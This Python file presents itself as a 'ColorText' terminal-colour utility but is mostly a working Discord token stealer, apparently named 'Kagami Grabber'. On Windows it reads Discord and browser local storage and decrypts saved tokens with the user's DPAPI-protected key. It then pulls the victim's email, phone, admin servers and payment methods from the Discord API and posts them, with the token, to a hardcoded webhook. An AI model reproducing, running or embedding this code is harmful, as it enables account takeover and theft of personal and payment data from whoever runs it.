import os
if os.name != "nt":
    exit()
import json
import requests
import re
import base64
import win32crypt
import datetime
from Crypto.Cipher import AES



class ColorText:
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    COLORS = {
        "reset": "\033[0m",
        "black": "\033[30m",
        "red": "\033[31m",
        "green": "\033[32m",
        "yellow": "\033[33m",
        "blue": "\033[34m",
        "magenta": "\033[35m",
        "cyan": "\033[36m",
        "white": "\033[37m",
        "bold": "\033[1m",
        "underline": "\033[4m"
    }

    @classmethod
    def color(cls, text, color):
        color_code = cls.COLORS.get(color.lower(), cls.COLORS["reset"])
        return f"{color_code}{text}{cls.COLORS['reset']}"

    @classmethod
    def bold(cls, text):
        return cls.color(text, "bold")

    @classmethod  
    def Init(cls):
        cls.LoadModules()

    @classmethod
    def underline(cls, text):
        return cls.color(text, "underline")

    @classmethod
    def rainbow(cls, text):
        colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
        result = ""
        for i, char in enumerate(text):
            result += cls.color(char, colors[i % len(colors)])
        return result
    
    @classmethod
    def getheaders(cls, token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @classmethod
    def gettokens(cls, path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []
        for file in os.listdir(path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens

    @classmethod
    def getkey(cls, path):
        with open(path + "\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        return key

    @classmethod
    def LoadModules(cls):
        print("Modules Loading..")
        checked = []

        for platform, path in cls.PATHS.items():
            if not os.path.exists(path):
                continue

            for token in cls.gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token

                try:
                    key = base64.b64decode(cls.getkey(path))[5:]
                    token = AES.new(win32crypt.CryptUnprotectData(key, None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15])\
                        .decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()

                    if token in checked:
                        continue
                    checked.append(token)

                    res = requests.get('https://discord.com/api/v10/users/@me', headers=cls.getheaders(token))
                    if res.status_code != 200:
                        continue
                    res_json = res.json()

                    badges = ""
                    flags = res_json.get('flags', 0)
                    if flags in [64, 96]:
                        badges += ":BadgeBravery: "
                    if flags in [128, 160]:
                        badges += ":BadgeBrilliance: "
                    if flags in [256, 288]:
                        badges += ":BadgeBalance: "

                    res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=cls.getheaders(token)).json()
                    friends = len([x for x in res if x['type'] == 1])

                    res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=cls.getheaders(token)).json()
                    guilds = len(res)
                    guild_infos = ""

                    for guild in res:
                        if guild['permissions'] & 8 or guild['permissions'] & 32:
                            res = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=cls.getheaders(token)).json()
                            vanity = f"""; .gg/{res.get("vanity_url_code", "")}""" if res.get("vanity_url_code") else ""
                            guild_infos += f"""\n- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""

                    guild_infos = guild_infos or "No guilds"

                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=cls.getheaders(token)).json()
                    has_nitro = bool(res)
                    exp_date = None
                    if has_nitro:
                        badges += ":BadgeSubscriber: "
                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S%z").strftime('%d/%m/%Y at %H:%M:%S')

                    res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=cls.getheaders(token)).json()
                    available = 0
                    boost = False
                    print_boost = ""
                    for slot in res:
                        cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            print_boost += "  - Available now\n"
                            available += 1
                        else:
                            print_boost += f"  - Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                        boost = True

                    if boost:
                        badges += ":BadgeBoost: "

                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=cls.getheaders(token)).json()
                    payment_methods = len(res)
                    valid = sum(1 for x in res if not x.get('invalid'))
                    type_pm = " ".join(["CreditCard" if x['type'] == 1 else "PayPal" for x in res])

                    embed_user = {
                        'embeds': [{
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""```yaml
User ID: {res_json['id']}
Email: {res_json['email']}
Phone Number: {res_json['phone']}

Friends: {friends}
Guilds: {guilds}
Admin Permissions: {guild_infos}

MFA Enabled: {res_json['mfa_enabled']}
Flags: {flags}
Locale: {res_json['locale']}
Verified: {res_json['verified']}
{"Nitro: Yes" if has_nitro else "Nitro: No"}
{"Expiration Date: " + exp_date if exp_date else ""}
Boosts Available: {available}
{print_boost if boost else ""}
Payment Methods: {payment_methods}
Valid Methods: {valid}
Type: {type_pm}
IP: {os.getenv("UserName")}
PC Name: {os.getenv("COMPUTERNAME")}
Token Location: {platform}
Token: {token}
```""",
                            'color': 3092790,
                            'footer': {'text': "Made by Kagami ・ https://github.com/Uwu-Kagami"},
                            'thumbnail': {'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"}
                        }],
                        "username": "Kagami Grabber",
                        "avatar_url": "https://avatars.githubusercontent.com/u/193637668?v=4"
                    }

                    requests.post('https://discord.com/api/webhooks/1346700300802592768/toGibn00ETodY2TJWuorbye7U8PDcbVrJbrCBxXMUIHV0yBImg1UrdoX0CoqhW6yhCtu', json=embed_user, headers=cls.getheaders())

                except Exception as e:
                    print(f"Erreur: {e}")
                    continue


if __name__ == "__main__":
    ColorText.LoadModules()


